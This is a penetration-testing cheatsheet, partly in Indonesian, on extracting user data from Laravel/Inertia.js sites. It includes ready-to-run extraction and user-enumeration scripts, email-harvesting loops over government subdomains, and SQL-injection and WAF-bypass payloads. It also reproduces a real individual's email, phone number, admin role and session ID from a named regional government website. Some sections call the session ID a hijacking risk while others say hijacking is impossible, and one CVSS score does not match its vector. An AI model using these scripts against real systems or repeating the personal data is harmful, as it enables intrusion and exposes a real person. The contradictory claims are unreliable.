# LARAVEL CHEATSHEET

# Case Study: Laravel Session Encryption vs id_session

## Scenario
Website menggunakan Laravel + Inertia.js. Halaman berita mengekspos data user dalam `data-page` HTML attribute termasuk `id_session`.

## Temuan
```
Username: taufiq
Email: novira.taufiq@gmail.com
Level: superadmin
Session ID: f4eff635e6dfe584a1a536dbc7718f3d
```

## Triple Verification (V1-V3)

### V1: Reproduce dengan Payload SAMA ✅
```bash
# Test 1
curl -s "https://target/berita" | grep -o 'data-page="[^"]*"' | python3 -c "import sys,json; data=json.load(sys.stdin); print([u['user']['id_session'] for item in data['props']['berita']['data'] if (u:=item.get('user'))])"

# Test 2 (ulang) - Output SAMA
# Test 3 (ulang) - Output SAMA
```
**Result:** ✅ Konsisten

### V2: Variasi Payload BERBEDA ✅
```bash
# Test dengan page berbeda
curl -s "https://target/berita?page=2" | grep -o '"id_session":"[^"]*"'
curl -s "https://target/berita?kategori=Pemerintahan" | grep -o '"id_session":"[^"]*"'

# Test dengan User-Agent berbeda
curl -s -H "User-Agent: Googlebot/2.1" "https://target/berita" | grep -o '"id_session":"[^"]*"'
```
**Result:** ✅ Konsisten di semua variasi

### V3: Clean Context ✅
```bash
# Tanpa cookies
curl -s -b "" "https://target/berita" | grep -o '"id_session":"[^"]*"'

# Dengan IP berbeda (simulasi)
curl -s -H "X-Forwarded-For: 192.168.1.100" "https://target/berita" | grep -o '"id_session":"[^"]*"'
```
**Result:** ✅ Tetap vulnerable

## Exploitability Verification (V4)

### Test Session Hijacking ❌
```bash
# Coba gunakan id_session sebagai session cookie
curl -b "pesselpesisirselatankab-session=f4eff635e6dfe584a1a536dbc7718f3d" "https://target/administrator"

# Response: Login page (BUKAN Dashboard)
```
**Result:** ❌ Session hijacking TIDAK BERHASIL

### Analisis Mengapa Gagal
```bash
# Cek format session cookie dari server
curl -sI "https://target/administrator" | grep -i "set-cookie"

# Output:
# Set-Cookie: pesselpesisirselatankab-session=eyJpdi...iIn0%3D

# Decode session cookie
echo "eyJpdi...iIn0%3D" | base64 -d

# Output:
# {"iv":"dwWkWYKa2x4ifwA6KrEn/A==","value":"WlLFNVkK3tyDEQZ+...","mac":"7e71ad922a0c3643ad3f1..."}
```

**Kesimpulan:** Laravel menggunakan AES-256-CBC encryption untuk session cookies. `id_session` di JSON adalah internal database identifier, BUKAN session cookie.

## Honest Assessment

| Finding | Status | Severity |
|---------|--------|----------|
| Information Disclosure (PII) | ✅ CONFIRMED | HIGH |
| User Enumeration | ✅ CONFIRMED | MEDIUM |
| Session Hijacking | ❌ NOT POSSIBLE | N/A |
| Account Takeover | ❌ NOT POSSIBLE | N/A |
| Social Engineering | ✅ POSSIBLE | MEDIUM |

## Laporan yang BENAR

**WRONG:**
"Session ID exposed enables session hijacking. Attacker can take over admin accounts."

**RIGHT:**
"Internal session identifier and PII exposed in client-side JSON. While session hijacking is not possible due to Laravel AES-256-CBC encryption, the exposed data enables targeted social engineering attacks and user enumeration. Superadmin account identified: taufiq (novira.taufiq@gmail.com)."

## Pelajaran

1. **Triple Verification (V1-V3)** memverifikasi vulnerability EXISTS
2. **Exploitability Verification (V4)** memverifikasi vulnerability EXPLOITABLE
3. **Honest Assessment** melaporkan apa yang BERHASIL dan TIDAK BERHASIL
4. Jangan asumsikan `id_session` = session cookie tanpa verifikasi
5. Selalu cek mekanisme keamanan framework sebelum claim impact

# Laravel/Inertia.js Data Extraction

Teknik untuk mengekstrak data sensitif dari aplikasi Laravel yang menggunakan Inertia.js.

---

## Identifikasi Target

**Ciri-ciri Laravel + Inertia.js:**
- Cookie: `XSRF-TOKEN`, `[name]-session`
- Response header: `X-Inertia: true`
- HTML: `<div id="app" data-page="...">`
- JavaScript: `import { createApp } from 'vue'`

---

## Teknik Ekstraksi

### Method 1: Browser Console

```javascript
// Extract data-page attribute
const pageData = document.querySelector('#app').getAttribute('data-page');

// Decode HTML entities
const decoded = pageData.replace(/&quot;/g, '"').replace(/&amp;/g, '&');

// Parse JSON
const data = JSON.parse(decoded);

// Access props
console.log(data.props);
```

### Method 2: curl + Python

```bash
curl -s "https://target.com/page" | \
  grep -o 'data-page="[^"]*"' | \
  sed 's/data-page="//;s/"$//' | \
  sed 's/&quot;/"/g;s/&amp;/\&/g' | \
  python3 -c "import sys,json; data=json.load(sys.stdin); print(data['props'])"
```

### Method 3: Python Script

```python
import requests
import json
import re
from html import unescape

def extract_inertia_data(url):
    r = requests.get(url, verify=False)
    
    # Find data-page attribute
    match = re.search(r'data-page="([^"]+)"', r.text)
    if not match:
        return None
    
    # Decode HTML entities
    json_str = unescape(match.group(1))
    
    # Parse JSON
    data = json.loads(json_str)
    
    return data['props']
```

---

## Data yang Sering Ter-expose

| Field | Risk | Notes |
|---|---|---|
| `id_session` | HIGH | Session Hijacking |
| `email` | MEDIUM | Social Engineering |
| `no_telp` | MEDIUM | Social Engineering |
| `level` | MEDIUM | Privilege Escalation |
| `password` | CRITICAL | Direct Access |
| `api_token` | CRITICAL | API Access |

---

## Contoh Temuan

```json
{
  "user": {
    "username": "admin",
    "nama_lengkap": "Administrator",
    "email": "admin@target.com",
    "no_telp": "08123456789",
    "level": "superadmin",
    "blokir": "N",
    "id_session": "ad66215525f8da3cd9a8a71f583a56ec"
  }
}
```

**Impact:**
- `id_session` dapat digunakan untuk Session Hijacking
- `level: superadmin` menunjukkan akun dengan hak akses penuh

---

## Remediation

```php
// Laravel - di Controller/Resource
public function toArray($request)
{
    return [
        'id' => $this->id,
        'username' => $this->username,
        // HAPUS field sensitif:
        // 'id_session' => $this->id_session,
        // 'email' => $this->email,
        // 'no_telp' => $this->no_telp,
        // 'level' => $this->level,
    ];
}
```

---

## Referensi

- [Inertia.js Documentation](https://inertiajs.com/)
- [Laravel Resources](https://laravel.com/docs/eloquent-resources)
- [CWE-200: Exposure of Sensitive Information](https://cwe.mitre.org/data/definitions/200.html)

# Laravel-Specific Penetration Testing Pitfalls

## Session Mechanism

### Critical: id_session ≠ Session Cookie

**Problem**: Laravel applications often expose an `id_session` field in JSON API responses (e.g., Inertia.js `data-page` attribute). This is NOT the same as the session cookie used for authentication.

**Technical Details**:
- `id_session`: Internal database identifier (32 hex characters, e.g., `f4eff635e6dfe584a1a536dbc7718f3d`)
- Session cookie: Laravel encrypted session (Base64 encoded, e.g., `eyJpdi...iIn0%3D`)
- Cookie format: `{"iv":"...","value":"...","mac":"..."}`
- Encryption: AES-256-CBC with Laravel APP_KEY

**Impact**: Session Hijacking is NOT possible even if `id_session` is exposed. The session cookie cannot be forged without the APP_KEY.

**What IS vulnerable** (still HIGH severity):
- User PII exposure (email, phone, level)
- User enumeration
- Targeted attacks against admin accounts
- Social engineering / phishing

### How to Verify

```bash
# Check session cookie format
curl -sI "https://target.com/administrator" | grep -i "set-cookie"

# Decode session cookie (Base64)
echo "eyJpdi..." | base64 -d

# Result should show: {"iv":"...","value":"...","mac":"..."}
# This confirms Laravel encrypted session
```

## Inertia.js Data Exposure

### data-page Attribute

Laravel + Inertia.js applications expose component data in the `data-page` HTML attribute:

```html
<div id="app" data-page="{&quot;component&quot;:&quot;...&quot;,&quot;props&quot;:{...},...}"></div>
```

**Decoding**:
```python
from html import unescape
decoded = html_string.replace('&quot;', '"').replace('&amp;', '&')
data = json.loads(decoded)
```

**Common exposed data**:
- User credentials (username, email, phone)
- Session identifiers
- User roles/levels
- Internal IDs

### Browser Console Extraction (UNRELIABLE)

**Problem**: HTML entity decoding in browser console often fails with:
- "Invalid or unexpected token"
- "Expected ',' or '}' after property value in JSON"

**Solution**: Always use Python scripts saved to file, not browser console JavaScript.

## PoC Execution Pitfalls

### Python one-liner Issues

**Problem**: `python3 -c "..."` with multi-line code causes IndentationError.

**Wrong**:
```bash
python3 -c "
import json
data = json.load(sys.stdin)
print(data)
"
```

**Correct**:
```bash
cat > /tmp/poc.py << 'EOF'
import json
data = json.load(sys.stdin)
print(data)
EOF
python3 /tmp/poc.py
```

### Browser Console JavaScript Issues

**Problem**: Complex JavaScript with HTML entities fails in browser console.

**Solution**: Use fetch API with proper error handling:

```javascript
fetch('https://target.com/berita')
  .then(function(r){return r.text()})
  .then(function(html){
    var m = html.match(/data-page="([^"]+)"/);
    if(m){
      var decoded = m[1].replace(/&quot;/g,'"').replace(/&amp;/g,'&');
      try {
        var data = JSON.parse(decoded);
        // Process data...
      } catch(e) {
        console.log('Parse error:', e.message);
      }
    }
  })
  .catch(function(e){console.log('Fetch error:', e.message)});
```

## Reporting

### DOCX Report Generation

Use python-docx to generate professional reports:

```python
from docx import Document
from docx.shared import Inches, Pt
from docx.enum.text import WD_ALIGN_PARAGRAPH

doc = Document()
doc.add_heading('PENETRATION TEST REPORT', 0)
# ... add content ...
doc.save('/path/to/report.docx')
```

### CVSS Scoring for Information Disclosure

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N = 6.5 Medium-High

Attack Vector (AV): Network
Attack Complexity (AC): Low
Privileges Required (PR): None
User Interaction (UI): None
Scope (S): Unchanged
Confidentiality (C): High - PII ter-expose
Integrity (I): None
Availability (A): None
```

# Laravel + Inertia.js Penetration Testing Reference

## Framework Identification

### Detection Signs
- Cookie names: `XSRF-TOKEN`, `{app_name}-session`
- Header: `X-Inertia` in responses
- JavaScript: Vue.js/React/Svelte with `@inertiajs/inertia`
- Meta tag: `<meta name="csrf-token" content="...">`
- Response contains: `"component":"Pages/..."` structure
- Build assets: `/build/assets/app-*.js` (Vite)

### Technology Stack
- Backend: Laravel (PHP)
- Frontend: Vue.js/React/Svelte via Inertia.js
- Server: Typically Apache/Nginx
- Build: Vite/Webpack with hashed assets

---

## Login Form Testing

### Critical Pitfall: 405 Method Not Allowed

**Problem**: Direct POST requests to `/login` return `405 Method Not Allowed`

**Reason**: Inertia.js forms submit via XHR with specific headers, not standard form POST

**Correct Testing Approach**:
```http
POST /login HTTP/1.1
Content-Type: application/json
X-Requested-With: XMLHttpRequest
X-Inertia: true
X-Inertia-Version: {version_hash}
Accept: text/html, application/xhtml+xml

{"email":"test@test.com","password":"test123","_token":"csrf_token"}
```

**Version Hash**: Found in page source as `"version":"hash_string"` or in `app.js`

### Extract Version Hash
```bash
curl -s https://target/login | grep -o '"version":"[^"]*"' | head -1
```

### SQL Injection Testing on Inertia.js Forms
```bash
# Must include Inertia headers!
curl -X POST https://target/login \
  -H "Content-Type: application/json" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "X-Inertia: true" \
  -H "X-Inertia-Version: HASH" \
  -d '{"email":"admin@test.com'\'' OR 1=1--","password":"test"}'
```

---

## Common Laravel Vulnerabilities to Test

### 1. Debug Mode Exposed
```
/ignition/health-check
/ignition/execute-solution
/ignition/update-config
```

### 2. Environment File Exposure
```
/.env
/.env.backup
/.env.production
/.env.local
/.env.example
```

### 3. Laravel Telescope (Development)
```
/telescope
/telescope/requests
/telescope/exceptions
```

### 4. API Route Discovery
```
/api
/api/v1
/api/user
/api/login
/api/register
```

### 5. Horizon (Queue Dashboard)
```
/horizon
/horizon/api/jobs
```

---

## Inertia.js Specific Attack Vectors

### 1. Version Hash Information Disclosure
- Version hash changes on each deployment
- Can be used to track deployments/updates
- Location: `data-page` attribute or JS bundle

### 2. Component Path Disclosure
```json
{
  "component": "Admin/Login",
  "props": {...},
  "url": "/administrator",
  "version": "hash"
}
```
- Reveals internal page structure
- Maps application routes

### 3. Props Data Leakage (CRITICAL FINDING PATTERN)
- Inertia responses may include sensitive data in `props`
- Check for user data, tokens, configuration in page source

**CRITICAL: User Data Exposure via `data-page` Attribute**

Laravel + Inertia.js applications often expose sensitive user data in the `data-page` HTML attribute. This is a HIGH severity vulnerability pattern.

**Detection:**
```bash
# Check for data-page attribute
curl -s https://target/berita | grep -o 'data-page="[^"]*"'

# Extract and decode the JSON
curl -s https://target/berita | grep -o 'data-page="[^"]*"' | \
  sed 's/data-page="//;s/"$//' | \
  python3 -c "import sys,html,json; print(json.dumps(json.loads(html.unescape(sys.stdin.read())), indent=2))"
```

**Data typically exposed:**
- Username, full name, email, phone number
- User role/level (admin, superadmin, kontributor)
- Session ID (CRITICAL - enables session hijacking)
- Account status (blocked/active)
- Profile photo filename

**Real-world example (Pesisir Selatan government site):**
```json
{
  "user": {
    "username": "taufiq",
    "nama_lengkap": "Novira Taufiq",
    "email": "novira.taufiq@gmail.com",
    "no_telp": "082172797131",
    "level": "superadmin",
    "blokir": "N",
    "id_session": "f4eff635e6dfe584a1a536dbc7718f3d"
  }
}
```

**Impact:**
- PII exposure (email, phone, user role)
- User enumeration (all users with roles visible)
- Targeted social engineering attacks
- Privilege escalation mapping (superadmin accounts identified)
- Privacy violation (GDPR/UU PDP compliance)

**CRITICAL PITFALL: Session Hijacking NOT Directly Possible**

The `id_session` field in the JSON is an **internal database identifier**, NOT the session cookie used for authentication. Laravel session cookies use AES-256-CBC encryption:

```
Cookie format: {"iv":"base64...","value":"encrypted...","mac":"hmac..."}
```

To verify if session hijacking is possible:
```bash
# Step 1: Get the session cookie format from server
curl -sI "https://target/administrator" | grep -i "set-cookie"

# Step 2: Decode the session cookie
curl -s -c cookies.txt "https://target/administrator" > /dev/null
grep "session" cookies.txt | awk '{print $NF}' | base64 -d 2>/dev/null

# Step 3: Try using id_session as cookie (will FAIL if encrypted)
curl -b "session_cookie=EXTRACTED_ID_SESSION" "https://target/administrator"
# If response shows "Login" page → Session hijacking NOT possible
# If response shows "Dashboard" → Session hijacking CONFIRMED
```

**Honest Assessment:**
- Information Disclosure: CONFIRMED (HIGH severity)
- Session Hijacking: NOT POSSIBLE (Laravel encryption)
- User Enumeration: CONFIRMED (MEDIUM severity)
- Social Engineering: POSSIBLE (MEDIUM severity)

**Remediation:**
1. Remove sensitive user data from Inertia props
2. Never expose internal session IDs in client-side data
3. Use API resources to filter exposed fields
4. Implement proper data access controls

**Extraction script (Python):**
```python
#!/usr/bin/env python3
"""Laravel Inertia.js User Data Extraction Script"""
import json, re, sys, html
from collections import defaultdict

def extract_users_from_data_page(content):
    """Extract user data from Inertia.js data-page attribute"""
    match = re.search(r'data-page="([^"]+)"', content)
    if not match:
        return []
    
    json_str = html.unescape(match.group(1))
    data = json.loads(json_str)
    
    users = []
    seen = set()
    
    def find_users(obj, path=""):
        if isinstance(obj, dict):
            # Check if this is a user object
            if 'username' in obj and 'email' in obj:
                username = obj['username']
                if username not in seen:
                    seen.add(username)
                    users.append({
                        'username': username,
                        'nama_lengkap': obj.get('nama_lengkap', 'N/A'),
                        'email': obj.get('email', 'N/A'),
                        'no_telp': obj.get('no_telp', 'N/A'),
                        'level': obj.get('level', 'N/A'),
                        'blokir': obj.get('blokir', 'N/A'),
                        'id_session': obj.get('id_session', 'N/A'),
                        'foto': obj.get('foto', 'N/A'),
                        'path': path
                    })
            # Recurse into dict values
            for key, value in obj.items():
                find_users(value, f"{path}.{key}" if path else key)
        elif isinstance(obj, list):
            for i, item in enumerate(obj):
                find_users(item, f"{path}[{i}]")
    
    find_users(data)
    return users

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 extract_inertia_users.py <html_file>")
        sys.exit(1)
    
    with open(sys.argv[1], 'r', encoding='utf-8') as f:
        content = f.read()
    
    users = extract_users_from_data_page(content)
    
    if not users:
        print("[INFO] No user data found in data-page attribute")
        return
    
    print("=" * 60)
    print("USER DATA EXPOSURE - INFORMATION DISCLOSURE")
    print("=" * 60)
    
    for user in users:
        print(f"\nUsername: {user['username']}")
        print(f"Nama Lengkap: {user['nama_lengkap']}")
        print(f"Email: {user['email']}")
        print(f"No Telp: {user['no_telp']}")
        print(f"Level: {user['level']}")
        print(f"Blokir: {user['blokir']}")
        print(f"Session ID: {user['id_session']}")
        print(f"Foto: {user['foto']}")
        print(f"Path: {user['path']}")
        print("-" * 40)
    
    print(f"\nTotal unique users found: {len(users)}")
    
    # Check for critical findings
    critical = [u for u in users if u['id_session'] != 'N/A' and u['id_session'] != '']
    if critical:
        print(f"\n[CRITICAL] {len(critical)} users with exposed Session IDs!")
        print("WARNING: id_session is internal DB identifier, NOT session cookie")
        print("Laravel session cookies are AES-256-CBC encrypted")
        print("Verify session hijacking possibility before reporting!")
        print("\nTo verify:")
        print("1. Check session cookie format: curl -sI URL | grep set-cookie")
        print("2. Decode cookie: echo COOKIE_VALUE | base64 -d")
        print("3. Try hijacking: curl -b 'cookie=ID_SESSION' URL/admin")

if __name__ == "__main__":
    main()
```

**Quick one-liner extraction:**
```bash
# Save page and extract users
curl -s "https://target/berita" > /tmp/page.html
python3 extract_inertia_users.py /tmp/page.html
```

---

## Email Harvesting from Laravel Applications

### Technique
Laravel applications often expose email addresses in:
1. Page content (contact pages, about pages)
2. JavaScript bundles (API endpoints, configuration)
3. Subdomain pages (PPID, WBS, JDIH, etc.)

### Automated Email Collection
```bash
# Collect emails from main domain
curl -s "https://target" | grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | sort -u

# Collect from multiple pages
for page in / /kontak /tentang /profil /berita; do
  curl -s "https://target$page" | grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
done | sort -u

# Collect from subdomains
for sub in ppid wbs jdih esakip simaya; do
  curl -s "https://$sub.target" | grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
done | sort -u
```

### Impact
- Social engineering targets
- Phishing campaign targets
- Brute force login targets
- Password reset targets

---

## Development Server Patterns

### Common Subdomain Patterns
```
devlop.{domain}     # Typo: "devlop" instead of "develop"
dev.{domain}
staging.{domain}
test.{domain}
demo.{domain}
training.{domain}
```

### Debug Tools to Look For
- **Kint**: PHP debugger (`.kint-rich-style`, `.kint-parent`)
- **Laravel Debugbar**: `debugbar_loader` script tag
- **Whoops**: Error handler with stack traces
- **Clockwork**: Browser extension debugger

### Directory Listing Exploitation
```
# Check for sensitive files in listed directories
.env
config/
storage/
vendor/
database/
app/Http/Controllers/
resources/views/
```

---

## Government Website (.go.id) Patterns

### Typical Attack Surface
- 100-500+ subdomains (nagari/kecamatan/dinas)
- Multiple cPanel instances (`cpanel.*`, `webmail.*`, `webdisk.*`)
- Legacy systems mixed with modern frameworks
- Email harvesting from website content
- Exposed employee information

### Common Subdomain Categories
```
# Administrative
admin.*, cpanel.*, webmail.*, webdisk.*

# Government Services
simpeg.* (employee system)
esakip.* (performance)
ppid.* (public information)
wbs.* (whistleblower)
jdih.* (legal info)
lpse.* (procurement)
simaya.* (mail system)

# Development
dev.*, devlop.*, staging.*, test.*, training.*
```

---

## Laravel Session Encryption - Critical Pitfall

### Understanding id_session vs Session Cookie

**Common Misconception**: Finding `id_session` in JSON response means session hijacking is possible.

**Reality**: Laravel session cookies are encrypted with AES-256-CBC:

```
Session Cookie Format:
{
  "iv": "base64_encoded_initialization_vector",
  "value": "AES-256-CBC_encrypted_data",
  "mac": "HMAC-SHA256_signature"
}
```

**id_session in JSON** = Internal database session identifier (plaintext)
**Session Cookie** = Encrypted session data (cannot be forged without APP_KEY)

### Verification Protocol

Before claiming session hijacking is possible:

```bash
# Step 1: Check if session cookie is encrypted
curl -sI "https://target/administrator" | grep -i "set-cookie"

# Step 2: Decode session cookie (should show JSON with iv/value/mac)
curl -s -c cookies.txt "https://target" > /dev/null
SESSION_COOKIE=$(grep "session" cookies.txt | awk '{print $NF}')
echo "$SESSION_COOKIE" | python3 -c "import sys,json,base64; print(json.dumps(json.loads(base64.b64decode(sys.stdin.read().strip())), indent=2))"

# Step 3: Try using id_session as cookie (WILL FAIL)
curl -b "session_cookie_name=EXTRACTED_ID_SESSION" "https://target/administrator"

# Step 4: Verify response
# If shows "Login" page → NOT vulnerable to session hijacking
# If shows "Dashboard" → VULNERABLE to session hijacking
```

### Impact Assessment Matrix

| Finding | Severity | Exploitable? |
|---------|----------|--------------|
| id_session exposed in JSON | HIGH | No (PII exposure only) |
| Session cookie encrypted | N/A | Protection mechanism |
| User email/phone exposed | HIGH | Yes (social engineering) |
| User role exposed | MEDIUM | Yes (targeted attacks) |
| Superadmin identified | HIGH | Yes (privilege escalation mapping) |

### Correct Reporting

**WRONG**: "Session ID exposed enables session hijacking"
**RIGHT**: "Internal session identifier exposed, combined with PII enables targeted social engineering attacks. Session hijacking not possible due to Laravel AES-256-CBC encryption."

---

## PoC Development Best Practices

### Copy-Paste Ready Commands

Users prefer PoC commands that can be directly copy-pasted and tested. Structure PoCs as:

**CRITICAL PITFALL: Shell pipes with `sed` + `python -c` break JSON parsing**

Complex `curl | grep | sed | python -c` pipelines fail with:
```
json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
```

Root cause: `sed 's/&quot;/"/g;s/&amp;/\&/g'` doesn't handle all HTML entities, and shell quoting mangles special characters.

**RELIABLE APPROACHES (pick one):**

1. **Two-step (save + parse) — MOST RELIABLE:**
```bash
curl -s "https://target/berita" -o /tmp/page.html
python3 -c "
import json, re
from html import unescape
with open('/tmp/page.html') as f:
    t = f.read()
m = re.search(r'data-page=\"([^\"]+)\"', t)
d = json.loads(unescape(m.group(1)))
for i in d['props']['berita']['data']:
    if 'user' in i:
        u = i['user']
        print(f'{u[\"username\"]} | {u[\"level\"]} | {u[\"email\"]} | {u[\"id_session\"]}')
"
```

2. **Standalone Python script — BEST FOR REPEATED USE:**
```python
#!/usr/bin/env python3
import requests, json, re
from html import unescape
import urllib3
urllib3.disable_warnings()

r = requests.get("https://target/berita", verify=False)
m = re.search(r'data-page="([^"]+)"', r.text)
d = json.loads(unescape(m.group(1)))
for i in d['props']['berita']['data']:
    if 'user' in i:
        u = i['user']
        print(f"{u['username']} | {u['level']} | {u['email']} | {u['id_session']}")
```

3. **Browser console (WAF bypass):**
```javascript
fetch('/berita').then(r=>r.text()).then(t=>{
  const m=t.match(/data-page="([^"]+)"/);
  if(m){
    const d=JSON.parse(m[1].replace(/&quot;/g,'"').replace(/&amp;/g,'&'));
    d.props.berita.data.forEach(i=>{
      if(i.user) console.log(i.user.username,'|',i.user.level,'|',i.user.email,'|',i.user.id_session);
    });
  }
});
```

**OLD APPROACH (FRAGILE — DO NOT USE):**
```bash
# THIS BREAKS — do not give this to users
curl -s URL | grep -o 'data-page="[^"]*"' | sed 's/...' | python3 -c "import sys,json; data=json.load(sys.stdin); ..."
```

### Verification Steps in PoC

Always include verification steps so user can confirm:
1. **What works** (information disclosure confirmed)
2. **What doesn't work** (session hijacking failed)
3. **Why** (Laravel encryption prevents direct cookie injection)

### Example PoC Structure

```
COMMAND 1: Quick Check (BERHASIL)
[command]

COMMAND 2: Session Hijacking (TIDAK BERHASIL)
[command]
# Note: Laravel uses encrypted sessions, id_session ≠ session cookie

COMMAND 3: Verified Impact
[command showing what IS confirmed]
```

---

## Security Headers Checklist for Laravel

### Required Headers
```
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Security-Policy: default-src 'self'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), camera=(), microphone=()
```

---

## Automated Testing Commands

### Reconnaissance
```bash
# Subdomain enumeration
subfinder -d target.go.id -silent -o subs.txt

# Technology fingerprinting
whatweb https://target.go.id -v

# Directory discovery
ffuf -u https://target.go.id/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403

# Nuclei scan
nuclei -u https://target.go.id -severity critical,high,medium
```

### Laravel-Specific
```bash
# Check debug mode
curl -s https://target/_ignition/health-check

# Check .env
curl -s https://target/.env -o /dev/null -w "%{http_code}"

# Check Telescope
curl -s https://target/telescope -o /dev/null -w "%{http_code}"

# Version hash extraction
curl -s https://target/login | grep -o '"version":"[^"]*"'
```

---

## WAF Bypass for Laravel Applications

### Common WAFs in Indonesian Government
- Cloudflare
- Imunify360
- ModSecurity

### Bypass Techniques
```json
# JSON injection (Laravel accepts JSON)
{"email":"admin' OR 1=1--","password":"test"}

# Unicode bypass
{"email":"admin\u0027 OR 1=1--","password":"test"}

# Double encoding
{"email":"admin%2527 OR 1=1--","password":"test"}
```

---

## Reporting Template

### Finding: Development Server Exposed
```
Title: Development Server with Debug Mode Enabled
Severity: High
OWASP: A05:2021 - Security Misconfiguration
URL: https://dev.target.go.id/
Description: Development server accessible with directory listing and debug tools enabled
Impact: Attackers can enumerate application structure, access debug information, potentially extract credentials
Remediation: 
1. Disable directory listing
2. Remove debug tools from production
3. Restrict access to development servers
4. Implement IP whitelisting
```

### Finding: Missing Security Headers
```
Title: Missing Security Headers
Severity: Medium
OWASP: A05:2021 - Security Misconfiguration
Description: Multiple security headers not implemented
Impact: Increased attack surface for XSS, clickjacking, MIME-type attacks
Remediation: Implement all recommended security headers
```

### Finding: User Data Exposure via Inertia.js
```
Title: Sensitive User Data Exposed in Client-Side JSON
Severity: High
OWASP: A01:2021 - Broken Access Control
CWE: CWE-200: Exposure of Sensitive Information
URL: https://target/berita
Description: Application exposes sensitive user data including session IDs, emails, phone numbers, and roles in the data-page HTML attribute
Impact: 
- Session hijacking via stolen session IDs
- Targeted social engineering attacks
- Privilege escalation mapping
Evidence:
- Session IDs exposed: f4eff635e6dfe584a1a536dbc7718f3d
- Admin emails exposed: admin@target.go.id
- User roles exposed: superadmin, kontributor
Remediation:
1. Remove sensitive user data from Inertia props
2. Never expose session IDs in client-side data
3. Use API resources to filter exposed fields
4. Implement proper data access controls
```

# Inertia.js / Vue.js SPA Reconnaissance

## Overview

Inertia.js (commonly paired with Laravel + Vue.js) embeds the **entire page data** as a JSON object inside the `data-page` HTML attribute. This includes all server-side props — often user PII, session IDs, article content, and internal metadata — accessible to any unauthenticated visitor via simple HTTP request.

**This is NOT XSS or injection.** The data is intentionally rendered by the framework for client-side hydration. The vulnerability is that developers pass sensitive data to the frontend without filtering.

## Detection

```bash
# Check if target uses Inertia.js
curl -s "https://TARGET/" | grep -i "data-page"

# Also check headers for X-Inertia
curl -sI "https://TARGET/" | grep -i "x-inertia"
```

## Extraction Technique

```bash
# Extract data-page attribute from any Inertia.js page
curl -s "https://TARGET/berita" | grep -oP 'data-page="[^"]*"' | python3 -c "
import sys, json, html
raw = sys.stdin.read()
if raw:
    start = raw.index('data-page=\"') + len('data-page=\"')
    end = raw.index('\"', start)
    data = json.loads(html.unescape(raw[start:end]))
    props = data.get('props', {})
    print('Component:', data.get('component'))
    print('Props keys:', list(props.keys()))
    print(json.dumps(props, indent=2, default=str))
" 2>/dev/null
```

## Common Sensitive Data Found

| Data Type | Field Names | Risk |
|-----------|-------------|------|
| User emails | `email`, `user.email` | Social engineering, phishing |
| Phone numbers | `no_telp`, `phone` | Targeted attacks |
| Session IDs | `id_session`, `session_id` | Session hijacking |
| User roles | `level`, `role`, `is_admin` | Targeted account takeover |
| Full names | `nama_lengkap`, `name` | Identity mapping |
| Article content | `isi_berita`, `content` | Data exfiltration |
| Internal IDs | `id_berita`, `id_user` | IDOR enumeration |
| View counts | `dibaca`, `views` | Business intelligence leak |

## Target-Specific Enumeration

```bash
# Enumerate all users from paginated content
for page in $(seq 1 5); do
  curl -s "https://TARGET/berita?page=$page" | grep -oP 'data-page="[^"]*"' | python3 -c "
import sys, json, html
raw = sys.stdin.read()
if raw:
    start = raw.index('data-page=\"') + len('data-page=\"')
    end = raw.index('\"', start)
    data = json.loads(html.unescape(raw[start:end]))
    items = data.get('props', {}).get('berita', {}).get('data', [])
    users = {}
    for item in items:
        u = item.get('user', {})
        if u and u.get('username') not in users:
            users[u['username']] = {
                'email': u.get('email'),
                'phone': u.get('no_telp'),
                'level': u.get('level'),
                'session': u.get('id_session')
            }
    for name, info in users.items():
        print(f'{name}: {info}')
" 2>/dev/null
done
```

## Other Endpoints to Check

- `/` (homepage — often has featured content with author data)
- `/berita`, `/artikel`, `/news` (paginated content)
- `/pengumuman` (announcements)
- `/suara-rakyat`, `/agenda` (public services)
- `/profil` (about pages)

## WAF Bypass Notes

This technique uses NO malicious payloads — it's a standard GET request. WAFs do not block it because there's nothing suspicious in the request. The vulnerability is in the server-side data exposure, not in the request itself.

## CVSS Scoring

- Base: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N = 7.5
- With session ID exposure: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 9.1

## Remediation (for reports)

1. Implement Laravel API Resources/Transformers to filter sensitive data
2. Never pass raw Eloquent models to Inertia::render()
3. Use `$this->only()` or explicit field selection in props
4. Rotate any exposed session IDs immediately